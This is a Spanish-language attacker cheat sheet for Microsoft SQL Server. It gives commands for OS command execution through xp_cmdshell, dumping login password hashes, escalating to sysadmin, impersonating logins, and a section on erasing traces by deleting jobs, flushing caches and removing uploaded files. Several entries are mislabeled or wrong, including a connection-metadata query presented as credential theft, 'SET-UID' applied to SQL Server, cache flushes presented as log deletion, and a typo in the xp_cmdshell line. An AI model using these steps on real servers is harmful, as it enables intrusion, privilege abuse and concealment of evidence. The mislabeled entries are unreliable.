```sql
exec -xp_cmdshell '{command}';
-- Ejecutar comando 
exec sp_configure '{option}', 0/1;
-- Activar o desactivar opción
RECONFIGURE
-- Actualizar el cambio de configuración aplicado
select name from master.sys.databases
-- Listar base de daots
select table_name from {db}.information_schema.tables
-- Listar tablas de la base de datos
use {db}
-- Usar la db para poder ver columnas 
select * from {table}
-- Mostrar todo para la base de datos


```

# Conexión a la base de datos:

-   Conexión básica desde la línea de comandos: `sqlcmd -S <IP_address> -U <username> -P <password>`
    
-   Conexión utilizando Integrated Security (sólo en Windows): `sqlcmd -S <IP_address> -E`
    
-   Conexión utilizando un archivo de configuración: `sqlcmd -S <IP_address> -U <username> -P <password> -i <file_path>`
    

# Recopilación de información:

-   Obtener la versión de SQL Server: `SELECT @@VERSION`
    
-   Obtener información sobre las bases de datos: `SELECT name, user_access_desc, is_read_only FROM sys.databases`
    
-   Obtener información sobre los usuarios: `SELECT name, type_desc, default_schema_name FROM sys.database_principals`
    
-   Obtener información sobre las tablas: `SELECT name FROM sys.tables`
    
-   Obtener información sobre las columnas de una tabla: `SELECT name, system_type_name FROM sys.columns WHERE object_id = OBJECT_ID('<table_name>')`
    

# Enumeración y explotación de vulnerabilidades:

-   Enumeración de cuentas de usuario con contraseñas débiles: `SELECT name, password_hash FROM sys.sql_logins WHERE is_disabled = 0 AND is_expiration_checked = 0 AND password_hash IS NOT NULL`
    
-   Obtención de credenciales de Windows (sólo en Windows): `SELECT auth_scheme, net_transport, protocol_type, encrypt_option FROM sys.dm_exec_connections WHERE session_id = @@SPID`
    
-   Explotación de SQL Injection: `SELECT * FROM <table_name> WHERE <vulnerable_parameter> = '<malicious_input>'`
    
-   Explotación de Buffer Overflow: Utilizar herramientas de explotación como Metasploit o Immunity Debugger.
    
-   Explotación de SQL Server Agent Job: Utilizar herramientas como PowerUpSQL o PowerView para buscar y explotar jobs mal configurados.
    
-   Explotación de SQL Server Integration Services (SSIS): Utilizar herramientas como Ysoserial.net para construir payloads maliciosos y ejecutarlos a través de SSIS.
    

# Escalada de privilegios:

-   Elevación de privilegios utilizando xp_cmdshell: `EXEC xp_cmdshell '<command>'`
    
-   Elevación de privilegios utilizando SET-UID: `CREATE PROCEDURE dbo.spAddLoginAsSysadmin AS EXEC sp_addsrvrolemember 'DOMAIN\Username', 'sysadmin'`
    
-   Elevación de privilegios utilizando impersonation: `EXECUTE AS LOGIN = '<login_name>'; <malicious_code>; REVERT;`
    

# Limpieza de huellas:

-   Eliminar la ejecución de comandos maliciosos: `DELETE FROM sysjobs WHERE name = '<job_name>'`
    
-   Eliminar los registros de las consultas realizadas: `DBCC FREEPROCCACHE; DBCC DROPCLEANBUFFERS;`
    
-   Eliminar las huellas de los archivos cargados: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; EXEC sp_OACreate 'Scripting.FileSystemObject', @object OUT; EXEC sp_OAMethod @object, 'DeleteFile', NULL, '<file_path>'; EXEC sp_OADestroy @object;